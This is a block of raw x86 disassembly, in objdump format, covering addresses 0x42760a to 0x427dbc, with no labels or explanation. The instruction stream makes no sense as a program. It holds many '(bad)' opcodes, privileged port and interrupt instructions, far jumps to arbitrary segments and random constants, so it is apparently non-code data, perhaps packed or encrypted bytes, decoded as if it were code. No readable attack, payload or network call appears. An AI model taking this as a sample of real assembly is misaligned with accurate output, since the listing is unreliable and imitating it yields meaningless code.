  42760a:	jns    0x4275b0
  42760c:	call   0xeaff7c7f
  427611:	push   edi
  427612:	arpl   dx,si
  427614:	dec    eax
  427615:	push   esi
  427616:	sbb    BYTE PTR [edi-0x3df8b0e4],al
  42761c:	jg     0x427663
  42761e:	push   es
  42761f:	outs   dx,DWORD PTR ds:[esi]
  427620:	xor    BYTE PTR [ecx+0x2bd31143],ch
  427626:	daa    
  427627:	ins    BYTE PTR es:[edi],dx
  427628:	cmc    
  427629:	inc    edi
  42762a:	rcr    edi,cl
  42762c:	inc    edx
  42762d:	loop   0x427605
  42762f:	aam    0x83
  427631:	and    al,0x5b
  427633:	xor    DWORD PTR [edx+0x61136509],ebx
  427639:	adc    BYTE PTR [esi+edx*1+0x20],al
  42763d:	jmp    DWORD PTR [ecx-0x1f9367ad]
  427643:	xchg   edi,eax
  427644:	sub    eax,0xf6e40fc6
  427649:	call   0x742cbde3
  42764e:	xchg   DWORD PTR [eax+0x68],ecx
  427651:	cmp    ah,ah
  427653:	(bad)  
  427654:	jbe    0x42768b
  427656:	sbb    dh,BYTE PTR [ecx]
  427658:	retf   0x38b3
  42765b:	rol    BYTE PTR [ebp+0x5dba19e3],cl
  427661:	or     BYTE PTR [edx-0x283f0726],dh
  427667:	mov    dh,0xeb
  427669:	scas   al,BYTE PTR es:[edi]
  42766a:	mov    dl,cl
  42766c:	aaa    
  42766d:	jno    0x42767b
  42766f:	sub    eax,DWORD PTR [esi-0x52]
  427672:	std    
  427673:	test   DWORD PTR [edi-0x47],0xa6152f7b
  42767a:	lods   eax,DWORD PTR ds:[esi]
  42767b:	dec    edx
  42767c:	fild   QWORD PTR [edx+edx*2-0x58]
  427680:	push   ebx
  427681:	and    eax,0xae511f22
  427686:	jp     0x4276d4
  427688:	add    cl,BYTE PTR ds:0xac528ef2
  42768e:	xchg   edx,eax
  42768f:	jo     0x4276a7
  427691:	fistp  QWORD PTR [ecx]
  427693:	xchg   ecx,eax
  427694:	jge    0x427641
  427696:	(bad)  
  427697:	addr16 mov edi,0xfe935b5c
  42769d:	dec    eax
  42769e:	and    dl,BYTE PTR cs:[ebp-0x26d986e9]
  4276a5:	pop    es
  4276a6:	add    al,0x80
  4276a8:	mov    al,ds:0xfe4bbbe9
  4276ad:	or     BYTE PTR [edx],al
  4276af:	cld    
  4276b0:	int    0xfc
  4276b2:	inc    esp
  4276b3:	bound  ebx,QWORD PTR [esi+0x70]
  4276b6:	data16 sub bh,BYTE PTR [ecx+0x7969891b]
  4276bd:	outs   dx,BYTE PTR ds:[esi]
  4276be:	jae    0x42767d
  4276c0:	xor    ch,bl
  4276c2:	fmul   DWORD PTR [eax]
  4276c4:	mov    ch,0xaf
  4276c6:	mov    dl,0x12
  4276c8:	dec    ebx
  4276c9:	repz add al,0x1b
  4276cc:	push   ebx
  4276cd:	sbb    eax,0x4cdb4ba7
  4276d2:	dec    edi
  4276d3:	dec    ebx
  4276d4:	push   edx
  4276d5:	jg     0x42767d
  4276d7:	call   0xd035:0x436781c
  4276de:	jg     0x4276dc
  4276e0:	in     eax,0xcd
  4276e2:	push   ds
  4276e3:	stos   BYTE PTR es:[edi],al
  4276e4:	add    ch,BYTE PTR [eax+0x2e166af5]
  4276ea:	hlt    
  4276eb:	xchg   edi,eax
  4276ec:	xchg   edi,esi
  4276ee:	lods   al,BYTE PTR ds:[esi]
  4276ef:	jno    0x42776b
  4276f1:	inc    esp
  4276f2:	nop
  4276f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276f4:	mov    ebp,0x7bcc98ba
  4276f9:	jno    0x42770e
  4276fb:	pop    eax
  4276fc:	ja     0x427734
  4276fe:	call   0xa8d2f609
  427703:	cld    
  427704:	jl     0x427758
  427706:	test   al,0x20
  427708:	and    BYTE PTR [edi+0x26],bh
  42770b:	ins    BYTE PTR es:[edi],dx
  42770c:	stc    
  42770d:	lock push ss
  42770f:	out    0x9f,al
  427711:	dec    ecx
  427712:	test   bh,0xc9
  427715:	iret   
  427716:	inc    edx
  427717:	and    ch,dh
  427719:	sub    ah,BYTE PTR [ecx-0x31c3b71b]
  42771f:	ins    DWORD PTR es:[edi],dx
  427720:	stc    
  427721:	sub    bh,BYTE PTR [eax+0x532887f1]
  427727:	xchg   ebp,eax
  427728:	or     BYTE PTR [ecx+0x6893028f],bl
  42772e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  427730:	push   cs
  427731:	dec    eax
  427732:	adc    ebx,DWORD PTR ss:[ecx+0x6f]
  427736:	enter  0x4535,0x7
  42773a:	mov    dh,0x34
  42773c:	jge    0x42779f
  42773e:	arpl   WORD PTR [ebx+0x5f960141],cx
  427744:	dec    eax
  427745:	jbe    0x42776b
  427747:	aam    0x3c
  427749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42774a:	push   0x5f
  42774c:	js     0x42778d
  42774e:	and    DWORD PTR [edx],0xffffffaa
  427751:	jle    0x427714
  427753:	lods   eax,DWORD PTR ds:[esi]
  427754:	stc    
  427755:	and    esp,DWORD PTR [edx+ebp*1]
  427758:	mov    ecx,0x6ef5e7e9
  42775d:	adc    eax,0x7746a0db
  427762:	jle    0x4277bc
  427764:	pop    edi
  427765:	ds jnp 0x427744
  427768:	jo     0x427730
  42776a:	popa   
  42776b:	push   esp
  42776c:	pop    ecx
  42776d:	or     eax,0xdc501b91
  427772:	pop    eax
  427773:	dec    ecx
  427774:	enter  0x9e51,0xc7
  427778:	(bad)  
  42777a:	lock dec esp
  42777c:	mov    dh,0xd1
  42777e:	pop    es
  42777f:	mov    fs,WORD PTR [eax-0x56bd5f0b]
  427785:	mov    al,ds:0xebfada32
  42778a:	js     0x427808
  42778c:	cmp    BYTE PTR [ebx+0x550d341c],bh
  427792:	lds    esp,FWORD PTR [esi]
  427794:	in     eax,dx
  427795:	inc    ecx
  427796:	pop    ds
  427797:	(bad)  
  427798:	in     eax,0x99
  42779a:	mov    dl,0xb3
  42779c:	jns    0x427770
  42779e:	popf   
  42779f:	xor    al,0x3f
  4277a1:	test   DWORD PTR [ecx],ebp
  4277a3:	rcl    esp,0x72
  4277a6:	les    esi,FWORD PTR [esi-0x4df39951]
  4277ac:	jne    0x4277b0
  4277ae:	das    
  4277af:	fisttp QWORD PTR [esi]
  4277b1:	pop    edi
  4277b2:	xor    eax,0xab9ce3f1
  4277b7:	dec    esp
	...
  4277c0:	add    BYTE PTR [esp+eax*2],ch
  4277c3:	and    edi,DWORD PTR [eax+0x6b]
  4277c6:	jg     0x427847
  4277c8:	push   esp
  4277c9:	adc    edi,DWORD PTR [ebp-0x40c45d8a]
  4277cf:	loope  0x427787
  4277d1:	pop    esp
  4277d2:	out    dx,al
  4277d3:	add    DWORD PTR [eax],eax
  4277d5:	scas   eax,DWORD PTR es:[edi]
  4277d6:	add    eax,DWORD PTR [eax]
  4277d8:	add    BYTE PTR [edi+0x5a97897f],dl
  4277de:	mov    al,0xa6
  4277e0:	je     0x42780e
  4277e2:	dec    edi
  4277e3:	sbb    dh,BYTE PTR [ebp-0x93690db]
  4277e9:	lds    esp,FWORD PTR [esi]
  4277eb:	inc    edx
  4277ec:	shr    BYTE PTR [ebp+0x13f02d94],cl
  4277f2:	xchg   esp,eax
  4277f3:	mov    cl,0xcc
  4277f5:	pusha  
  4277f6:	icebp  
  4277f7:	mov    cl,0xce
  4277f9:	test   eax,0x6b37900b
  4277fe:	dec    ecx
  4277ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427800:	lahf   
  427801:	stos   BYTE PTR es:[edi],al
  427802:	push   es
  427803:	dec    edx
  427804:	jecxz  0x427854
  427806:	sbb    eax,0x4b7786f3
  42780b:	jne    0x427812
  42780d:	shl    dh,1
  42780f:	fbstp  TBYTE PTR [ecx+0x5ba9dfa7]
  427815:	add    al,0xce
  427817:	dec    eax
  427818:	sar    dl,1
  42781a:	inc    eax
  42781b:	(bad)  
  42781c:	jns    0x4277dc
  42781e:	adc    eax,0xee8ff933
  427823:	cdq    
  427824:	ins    DWORD PTR es:[edi],dx
  427825:	rcr    dh,0x1a
  427828:	sbb    BYTE PTR [ebp-0x453e897a],ch
  42782e:	retf   
  42782f:	ret    
  427830:	lea    ebp,[eax-0x7ae0a04c]
  427836:	test   BYTE PTR [ebp-0x2e],cl
  427839:	add    ch,BYTE PTR [eax+0x794fc526]
  42783f:	cs push ebp
  427841:	add    al,0x3a
  427843:	cdq    
  427844:	sbb    eax,0xeb75832f
  427849:	mov    WORD PTR [ebp-0x7eb4829a],fs
  42784f:	sub    al,0x13
  427851:	xchg   edi,eax
  427852:	cwde   
  427853:	(bad)  
  427854:	fld    TBYTE PTR [edi+0x35]
  427857:	mov    al,ds:0xb38bbd26
  42785c:	pop    esp
  42785d:	inc    ecx
  42785e:	dec    edx
  42785f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427860:	mov    bh,0x25
  427862:	retf   
  427863:	sbb    eax,0xed14dd04
  427868:	into   
  427869:	addr16 aaa 
  42786b:	sahf   
  42786c:	mov    al,dl
  42786e:	call   0xaefb:0x9126c2e8
  427875:	cmc    
  427876:	jg     0x42789b
  427878:	in     eax,dx
  427879:	xor    dh,BYTE PTR [ecx+0x1110ed4b]
  42787f:	(bad)  
  427880:	or     eax,0x6bb6616d
  427885:	inc    eax
  427886:	in     eax,0x6b
  427888:	jp     0x42785f
  42788a:	mov    ch,0x8f
  42788c:	lock push ebp
  42788e:	push   eax
  42788f:	cs mov ebp,0x351649f0
  427895:	sub    esi,DWORD PTR [edi+0x40]
  427898:	leave  
  427899:	aaa    
  42789a:	fld    TBYTE PTR ds:0xa362170e
  4278a0:	fistp  WORD PTR [ebx+0xb]
  4278a3:	pcmpgtw mm3,QWORD PTR [edi+0x1f]
  4278a7:	(bad)  
  4278a8:	adc    al,0xe3
  4278aa:	sbb    bl,BYTE PTR [ecx-0x5ad4608c]
  4278b0:	call   FWORD PTR [esi]
  4278b2:	mov    edi,DWORD PTR [ecx-0x13]
  4278b5:	nop
  4278b6:	ret    
  4278b7:	pop    ds
  4278b8:	sbb    DWORD PTR [ebp-0x24],ebp
  4278bb:	mov    ebp,0xc69534c2
  4278c0:	icebp  
  4278c1:	and    eax,0x469c2f34
  4278c6:	fsubr  st,st(3)
  4278c8:	push   0xa31629ca
  4278cd:	jmp    0x427850
  4278cf:	jl     0x427934
  4278d1:	das    
  4278d2:	and    dh,BYTE PTR [edx+ecx*2+0x21]
  4278d6:	pop    ss
  4278d7:	js     0x4278d8
  4278d9:	scas   eax,DWORD PTR es:[edi]
  4278da:	out    dx,al
  4278db:	push   es
  4278dc:	call   0xc097:0xa28f3f4e
  4278e3:	in     eax,0x44
  4278e5:	adc    BYTE PTR [ebp+0x63],al
  4278e8:	in     eax,dx
  4278e9:	push   eax
  4278ea:	push   0x43
  4278ec:	test   dh,bl
  4278ee:	imul   BYTE PTR [ecx+0x449dffa3]
  4278f4:	pusha  
  4278f5:	or     BYTE PTR [ebp+0x438e7559],0xb9
  4278fc:	sub    eax,0x2fbdf9f9
  427901:	mov    dh,0x5f
  427903:	xlat   BYTE PTR ds:[ebx]
  427904:	loopne 0x4278cf
  427906:	xor    edi,DWORD PTR [ecx-0x69a9613d]
  42790c:	jne    0x4278f0
  42790e:	sar    DWORD PTR ds:0x4860803d,cl
  427914:	nop
  427915:	test   dl,0x42
  427918:	cmp    al,0x15
  42791a:	ror    BYTE PTR [ebp+0x3d325425],1
  427920:	jnp    0x427917
  427922:	mov    dl,0xb8
  427924:	and    cl,dh
  427926:	jne    0x42796b
  427928:	push   ss
  427929:	jne    0x427965
  42792b:	das    
  42792c:	xor    al,0x5d
  42792e:	jmp    0x93f2:0x5089572
  427935:	push   ebp
  427936:	push   ebx
  427937:	mov    ah,0xfa
  427939:	nop
  42793a:	lock jno 0x427964
  42793d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42793e:	rcl    DWORD PTR [ecx-0xb],0x72
  427942:	jge    0x427922
  427944:	xchg   ecx,eax
  427945:	mov    dh,0xa8
  427947:	mov    ebx,0xd33c8546
  42794c:	(bad)  
  42794e:	jmp    ebp
  427950:	mov    dh,0x8
  427952:	in     al,0x7b
  427954:	dec    eax
  427955:	ss inc edx
  427957:	clc    
  427958:	mov    esi,0xcf10d0a5
  42795d:	dec    ebx
  42795e:	sti    
  42795f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427960:	mov    ah,0xe8
  427962:	data16 and BYTE PTR [ebp-0x42],0xe2
  427967:	in     eax,0x8a
  427969:	nop
  42796a:	push   ecx
  42796b:	mov    al,ds:0x89e87200
  427970:	sub    BYTE PTR [edx+0x264a5e29],bl
  427976:	sbb    bh,dh
  427978:	push   esp
  427979:	inc    DWORD PTR [ebx]
  42797b:	mov    cl,BYTE PTR [ebp+0x2c]
  42797e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42797f:	stc    
  427980:	jae    0x42792f
  427982:	icebp  
  427983:	mov    esi,0x37c35020
  427988:	(bad)  
  427989:	lods   eax,DWORD PTR ds:[esi]
  42798a:	lock (bad) 
  42798c:	cmp    edi,DWORD PTR [esi+0x1a]
  42798f:	pop    ebp
  427990:	inc    eax
  427991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427992:	mov    dh,0x10
  427994:	mov    eax,ds:0xb792bdf9
  427999:	xor    cl,BYTE PTR [ecx]
  42799b:	xlat   BYTE PTR ds:[ebx]
  42799c:	les    edi,FWORD PTR [edi]
  42799e:	call   0x85eda042
  4279a3:	fisubr WORD PTR [ebx]
  4279a5:	sbb    esi,DWORD PTR [edx]
  4279a7:	mov    dl,BYTE PTR [ecx+esi*8]
  4279aa:	mov    eax,ds:0xd268d880
  4279af:	lds    edi,FWORD PTR [edi-0x1b3a0893]
  4279b5:	iret   
  4279b6:	mov    WORD PTR [esi-0x45533a7],es
  4279bc:	jns    0x427a2f
  4279be:	inc    ecx
  4279bf:	sub    eax,0xcc720c96
  4279c4:	pop    esp
  4279c5:	inc    ebx
  4279c6:	cmp    al,0x93
  4279c8:	adc    BYTE PTR [ebx+0x5e4b49b5],bh
  4279ce:	in     eax,0x4
  4279d0:	pop    ecx
  4279d1:	add    al,0x70
  4279d3:	test   al,0xf8
  4279d5:	jecxz  0x4279b1
  4279d7:	mov    bl,bl
  4279d9:	pop    ecx
  4279da:	push   ecx
  4279db:	or     ebp,DWORD PTR [ebx+0x35]
  4279de:	fmul   DWORD PTR [edx+0x1c30e835]
  4279e4:	jbe    0x42799e
  4279e6:	shl    DWORD PTR [ebx],0xb4
  4279e9:	aad    0x15
  4279eb:	pop    esp
  4279ec:	rol    BYTE PTR ds:0x73b7834c,0x3e
  4279f3:	loopne 0x42797a
  4279f5:	ds stos BYTE PTR es:[edi],al
  4279f7:	idiv   eax
  4279f9:	mov    eax,ds:0x8a4136d5
  4279fe:	xchg   edx,eax
  4279ff:	inc    esi
  427a00:	lea    edx,[ecx+0x7a]
  427a03:	pop    eax
  427a04:	sbb    al,0xf3
  427a06:	jp     0x427a64
  427a08:	mov    esi,0xe7fd4ac2
  427a0d:	fiadd  WORD PTR [ebp+edx*1+0x7b]
  427a11:	jmp    0x28e6:0xa68488d8
  427a18:	pop    esi
  427a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a1a:	mov    ds:0x2275f9a,eax
  427a1f:	call   0xaa5e4c35
  427a24:	pop    ds
  427a25:	mov    edx,0x73692230
  427a2a:	dec    esp
  427a2b:	loop   0x427a9e
  427a2d:	out    0x3c,al
  427a2f:	mov    ch,0x7f
  427a31:	adc    eax,0xeb5b3862
  427a36:	jbe    0x427a54
  427a38:	ror    edi,1
  427a3a:	and    al,0x8d
  427a3c:	iret   
  427a3d:	popa   
  427a3e:	mov    DWORD PTR [ebx],edi
  427a40:	jle    0x4279e9
  427a42:	xchg   edi,eax
  427a43:	mov    dh,bh
  427a45:	js     0x427a3a
  427a47:	jmp    0x2df934f0
  427a4c:	je     0x427a3e
  427a4e:	fimul  DWORD PTR [eax-0x3f]
  427a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a52:	cmp    eax,0x9ce7d347
  427a57:	jns    0x4279ea
  427a59:	push   eax
  427a5a:	test   al,0x93
  427a5c:	in     al,0x7b
  427a5e:	mov    ds:0xac0aec5e,al
  427a63:	mov    ch,0x12
  427a65:	mov    ecx,0x109122ee
  427a6a:	jg     0x427a48
  427a6c:	xor    eax,0x890dc9cc
  427a71:	sbb    DWORD PTR [ebx],ebx
  427a73:	and    bh,dh
  427a75:	es and al,0xc0
  427a78:	outs   dx,DWORD PTR ds:[esi]
  427a79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a7a:	cmp    eax,0x12fcc981
  427a7f:	rcr    BYTE PTR [eax-0x3ea5b1fb],1
  427a85:	and    ecx,ebx
  427a87:	sti    
  427a88:	push   ebp
  427a89:	iret   
  427a8a:	add    al,0x72
  427a8c:	mov    dl,0x40
  427a8e:	push   es
  427a8f:	add    eax,DWORD PTR [ebp-0x67]
  427a92:	adc    BYTE PTR [edi],bl
  427a94:	clc    
  427a95:	cli    
  427a96:	in     al,0xf4
  427a98:	sub    al,0x56
  427a9a:	mov    ss,eax
  427a9c:	jp     0x427a45
  427a9e:	xor    ch,BYTE PTR [eax]
  427aa0:	cwde   
  427aa1:	mov    ah,0x71
  427aa3:	lahf   
  427aa4:	push   eax
  427aa5:	sbb    al,0xca
  427aa7:	cmp    al,0x31
  427aa9:	adc    al,0x81
  427aab:	sub    ebx,DWORD PTR [ebx+edi*2-0x325f4b98]
  427ab2:	lock xor al,0x4d
  427ab5:	jbe    0x427a64
  427ab7:	xchg   ebx,eax
  427ab8:	add    eax,ecx
  427aba:	mov    ebp,ebx
  427abc:	adc    eax,0xf7203b8f
  427ac1:	adc    edx,DWORD PTR [edx]
  427ac3:	push   edi
  427ac4:	adc    ebx,DWORD PTR [edx]
  427ac6:	ret    0xdca7
  427ac9:	inc    edx
  427aca:	inc    edx
  427acb:	pop    eax
  427acc:	test   ebp,edx
  427ace:	(bad)  
  427acf:	fld1   
  427ad1:	cli    
  427ad2:	xor    bl,bh
  427ad4:	test   DWORD PTR [ecx-0x18660d81],ebx
  427ada:	pop    ecx
  427adb:	jnp    0x427abb
  427add:	shr    DWORD PTR [esi-0x5e5cf77a],0x21
  427ae4:	add    BYTE PTR [ebx+0x75],ah
  427ae7:	push   esi
  427ae8:	mov    ch,BYTE PTR [edi+0x7d2b908e]
  427aee:	stos   DWORD PTR es:[edi],eax
  427aef:	lahf   
  427af0:	push   edi
  427af1:	hlt    
  427af2:	add    BYTE PTR [ebx],al
  427af4:	cmp    al,0xf8
  427af6:	mov    bh,bh
  427af8:	cs repnz sub bl,ch
  427afc:	mov    WORD PTR [eax+0x135afe85],ss
  427b02:	push   ecx
  427b03:	pop    esp
  427b04:	pop    edi
  427b05:	(bad)  
  427b07:	gs (bad) 
  427b09:	xchg   ebx,eax
  427b0a:	outs   dx,DWORD PTR ds:[esi]
  427b0b:	add    eax,DWORD PTR gs:[esi]
  427b0e:	add    esi,DWORD PTR [eax-0xae1da37]
  427b14:	and    al,0xd1
  427b16:	push   ss
  427b17:	mov    ds:0x222b4ad1,al
  427b1c:	imul   esp,DWORD PTR [esi+ebx*4],0x4f
  427b20:	dec    esi
  427b21:	test   BYTE PTR [ebx-0x5c],al
  427b24:	lea    edx,[ecx]
  427b26:	jnp    0x427b28
  427b28:	int3   
  427b29:	mov    gs,esi
  427b2b:	mov    eax,0xfeac9641
  427b30:	push   es
  427b31:	repnz and eax,0xb031830b
  427b37:	out    dx,eax
  427b38:	idiv   DWORD PTR [ecx+0x56e8068]
  427b3e:	push   0x79f55de9
  427b43:	xchg   edi,edi
  427b45:	ins    BYTE PTR es:[edi],dx
  427b46:	je     0x427bae
  427b48:	cmp    esi,DWORD PTR [ecx]
  427b4a:	mov    ah,0xc2
  427b4c:	mov    eax,0xcbf4388a
  427b51:	xchg   esi,eax
  427b52:	sub    eax,0x785e4525
  427b57:	retf   0xb873
  427b5a:	push   ebp
  427b5b:	jg     0x427bbb
  427b5d:	inc    esp
  427b5e:	add    ecx,edi
  427b60:	ins    BYTE PTR es:[edi],dx
  427b61:	scas   eax,DWORD PTR es:[edi]
  427b62:	or     eax,0x6e14e6f
  427b67:	jge    0x427bb4
  427b69:	loopne 0x427ba3
  427b6b:	pop    esi
  427b6c:	mov    edi,edx
  427b6e:	pop    edi
  427b6f:	and    al,0x42
  427b71:	sub    BYTE PTR [eax-0x78b43ebc],ch
  427b77:	mov    esp,0xc5c39ba2
  427b7c:	mov    bh,0x57
  427b7e:	push   0xffffffd0
  427b80:	ja     0x427b31
  427b82:	inc    esi
  427b83:	test   al,0x59
  427b85:	xchg   DWORD PTR [esi+0xdb],esp
  427b8b:	add    BYTE PTR [eax],al
  427b8d:	add    BYTE PTR [eax],al
  427b8f:	add    BYTE PTR [eax],al
  427b91:	sub    esp,eax
  427b93:	jnp    0x427bcd
  427b95:	sti    
  427b96:	mov    ebx,0x345ef36b
  427b9b:	aaa    
  427b9c:	mov    ebp,edi
  427b9e:	cmc    
  427b9f:	xchg   ah,bh
  427ba1:	or     esi,edx
  427ba3:	add    DWORD PTR [eax],eax
  427ba5:	scas   eax,DWORD PTR es:[edi]
  427ba6:	add    eax,DWORD PTR [eax]
  427ba8:	add    BYTE PTR [eax-0x1f],dh
  427bab:	push   0x4447af41
  427bb0:	inc    ebp
  427bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bb3:	cmp    BYTE PTR [ebx],0xd0
  427bb6:	mov    WORD PTR [ebp-0x74072992],es
  427bbc:	adc    esp,DWORD PTR [bx+di+0x3d]
  427bc0:	sbb    edx,DWORD PTR [edx+0x2c64626d]
  427bc6:	mov    ah,0x1e
  427bc8:	mov    ebx,0x2577f01f
  427bcd:	pop    es
  427bce:	adc    al,0x8d
  427bd0:	test   BYTE PTR [esi+0x4684e849],cl
  427bd6:	btr    DWORD PTR [ebx-0x2c],esp
  427bda:	lds    edi,FWORD PTR [ebp-0x77]
  427bdd:	jecxz  0x427c4a
  427bdf:	shl    DWORD PTR [eax-0x66],1
  427be2:	push   0xffffffe4
  427be4:	or     dl,dh
  427be6:	repz xchg ebp,eax
  427be8:	loop   0x427bb4
  427bea:	shl    DWORD PTR [edi+0x33],1
  427bed:	imul   ecx
  427bef:	pop    eax
  427bf0:	xchg   esi,eax
  427bf1:	dec    ecx
  427bf2:	dec    ecx
  427bf3:	(bad)  
  427bf4:	mul    edx
  427bf6:	fs je  0x427bb8
  427bf9:	sub    BYTE PTR [ebx],bh
  427bfb:	clc    
  427bfc:	adc    BYTE PTR [ecx-0x68fb3821],dl
  427c02:	jmp    0x3db9:0xa970de8a
  427c09:	dec    ebx
  427c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c0b:	push   0x5f
  427c0d:	xchg   DWORD PTR [edi],ebp
  427c0f:	pop    esi
  427c10:	and    al,0xcb
  427c12:	cmp    al,0x6d
  427c14:	sbb    BYTE PTR [edx],al
  427c16:	mov    dh,0x72
  427c18:	enter  0x2487,0x61
  427c1c:	adc    DWORD PTR [ecx+0x2668bf4c],0xfffffff3
  427c23:	lods   eax,DWORD PTR ds:[esi]
  427c24:	lock cmp DWORD PTR [edx+0xf],edx
  427c28:	int    0xe1
  427c2a:	mov    esp,0xc88d403c
  427c2f:	jp     0x427c05
  427c31:	and    cl,BYTE PTR [ecx+0x2c]
  427c34:	dec    esi
  427c35:	into   
  427c36:	xor    BYTE PTR [edx+0x35],bl
  427c39:	popa   
  427c3a:	mov    esi,0x49f5cdd5
  427c3f:	mov    bh,0xbc
  427c41:	xor    DWORD PTR [eax+0x26],esp
  427c44:	das    
  427c45:	iret   
  427c46:	xlat   BYTE PTR ds:[ebx]
  427c47:	shl    DWORD PTR [edx+0x1554dcb6],cl
  427c4d:	xchg   esp,eax
  427c4e:	mov    ebp,0x9917a56e
  427c53:	aam    0x35
  427c55:	add    al,0x86
  427c57:	jae    0x427bdb
  427c59:	into   
  427c5a:	mov    dh,0xe7
  427c5c:	xchg   esi,eax
  427c5d:	push   es
  427c5e:	jmp    0x847007a1
  427c63:	xchg   ebp,eax
  427c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c65:	adc    BYTE PTR [edi],dl
  427c67:	adc    ah,BYTE PTR [edi-0xa]
  427c6a:	add    edi,edx
  427c6c:	and    BYTE PTR [esi-0x11],ch
  427c6f:	adc    esp,ebx
  427c71:	or     DWORD PTR [eax+0x43f1babb],ebx
  427c77:	lods   al,BYTE PTR ds:[esi]
  427c78:	and    BYTE PTR [ebx-0x42],0x77
  427c7c:	rcl    DWORD PTR [esi-0x62],0xc8
  427c80:	ret    0xdf83
  427c83:	and    edi,0xffffffc8
  427c86:	out    0x8f,al
  427c88:	dec    esi
  427c89:	cmp    edi,esi
  427c8b:	es test al,0x2
  427c8e:	push   cs
  427c8f:	adc    al,0x46
  427c91:	jg     0x427d09
  427c93:	mov    ebx,0xe617c806
  427c98:	addr16 jp 0x427cd4
  427c9b:	out    0x73,eax
  427c9d:	data16 xchg BYTE PTR [eax+0x2b],dl
  427ca1:	nop
  427ca2:	mov    esi,0xfcdad217
  427ca7:	into   
  427ca8:	or     eax,0xff8d4e21
  427cad:	push   esp
  427cae:	push   esp
  427caf:	enter  0x2bf8,0xf7
  427cb3:	jnp    0x427ce9
  427cb5:	mov    BYTE PTR [ebx+0x43],bl
  427cb8:	(bad)  
  427cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cba:	mov    eax,ds:0xaa26fd3b
  427cbf:	popa   
  427cc0:	xor    BYTE PTR [ebx+0xf],ah
  427cc3:	sti    
  427cc4:	cdq    
  427cc5:	mov    ebx,DWORD PTR [ecx]
  427cc7:	ja     0x427d0f
  427cc9:	sub    DWORD PTR [esi],ebp
  427ccb:	hlt    
  427ccc:	cmp    al,BYTE PTR [edi-0x60]
  427ccf:	mov    ebp,0x90219d8
  427cd4:	fwait
  427cd5:	out    dx,al
  427cd6:	mov    dl,0xac
  427cd8:	xchg   edx,eax
  427cd9:	fdivrp st(4),st
  427cdb:	xchg   esi,eax
  427cdc:	fs inc ebp
  427cde:	add    ebx,DWORD PTR [ebx]
  427ce0:	icebp  
  427ce1:	(bad)  
  427ce2:	jbe    0x427d1e
  427ce4:	cmp    DWORD PTR [edx],0x2dd11c87
  427cea:	outs   dx,BYTE PTR ds:[esi]
  427ceb:	fs inc edi
  427ced:	cmp    BYTE PTR [ecx],0x9f
  427cf0:	xor    BYTE PTR [ebx-0x31],cl
  427cf3:	in     eax,0xd2
  427cf5:	mov    dl,0xe1
  427cf7:	xchg   BYTE PTR [eax],cl
  427cf9:	inc    edi
  427cfa:	cwde   
  427cfb:	jns    0x427d6b
  427cfd:	adc    BYTE PTR [ebx-0x2],ch
  427d00:	xchg   edi,eax
  427d01:	cdq    
  427d02:	sub    ch,cl
  427d04:	jbe    0x427d81
  427d06:	cmp    eax,0x7c7e6927
  427d0b:	push   ebx
  427d0c:	pop    ecx
  427d0d:	sub    al,0x24
  427d0f:	loopne 0x427d7b
  427d11:	mov    dl,BYTE PTR ds:0xf7efaa02
  427d17:	in     eax,0x48
  427d19:	xchg   esp,eax
  427d1a:	cmp    al,0xcd
  427d1c:	mov    dl,0x14
  427d1e:	add    esi,edx
  427d20:	ror    DWORD PTR [eax-0x4ed2768e],1
  427d26:	xchg   ecx,eax
  427d27:	(bad)  
  427d28:	call   0x16bb42a9
  427d2d:	rol    DWORD PTR [edi-0x3c15b499],1
  427d33:	imul   edi,DWORD PTR [edx+eiz*1+0x637cc718],0xc2643ef
  427d3e:	jo     0x427d00
  427d40:	dec    ebp
  427d41:	(bad)  
  427d43:	cmp    esi,DWORD PTR [eax-0x6f]
  427d46:	push   esp
  427d47:	xchg   ebx,eax
  427d48:	stos   DWORD PTR es:[edi],eax
  427d49:	sbb    eax,0x83e95988
  427d4e:	stc    
  427d4f:	jg     0x427cfd
  427d51:	push   0x3eb066aa
  427d56:	push   0x2f6354a5
  427d5b:	dec    ecx
  427d5c:	jne    0x427d07
  427d5e:	fwait
  427d5f:	rol    eax,0xa0
  427d62:	rcr    BYTE PTR [eax-0x7e],0x8a
  427d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d67:	xchg   ecx,eax
  427d68:	fnstcw WORD PTR [edx+0x2a]
  427d6b:	mov    eax,0x7c16cf24
  427d70:	dec    ecx
  427d71:	cli    
  427d72:	cmp    al,0xb5
  427d74:	xchg   ecx,eax
  427d75:	push   es
  427d76:	sar    DWORD PTR [edx],cl
  427d78:	sbb    DWORD PTR [eax+0x442d207d],ebp
  427d7e:	mov    DWORD PTR [edi+0x17],edi
  427d81:	add    eax,0x1673d956
  427d86:	cdq    
  427d87:	mov    edx,0x972ce0bd
  427d8c:	in     al,0x69
  427d8e:	sbb    DWORD PTR [edx+0x7724ea09],edx
  427d94:	and    al,0xef
  427d96:	pushf  
  427d97:	lods   al,BYTE PTR ds:[esi]
  427d98:	add    eax,0x2db754ef
  427d9d:	loope  0x427dfb
  427d9f:	mov    WORD PTR [eax+0x13],gs
  427da2:	xchg   esi,eax
  427da3:	mov    ds:0x6eb017e0,eax
  427da8:	inc    ecx
  427da9:	aaa    
  427daa:	scas   al,BYTE PTR es:[edi]
  427dab:	and    eax,0x41def3b2
  427db0:	and    bh,BYTE PTR es:[edi+0x2a8dcebc]
  427db7:	sbb    BYTE PTR [edi],0xf4
  427dba:	sub    ebp,esp
  427dbc:	jb     0x427d6c
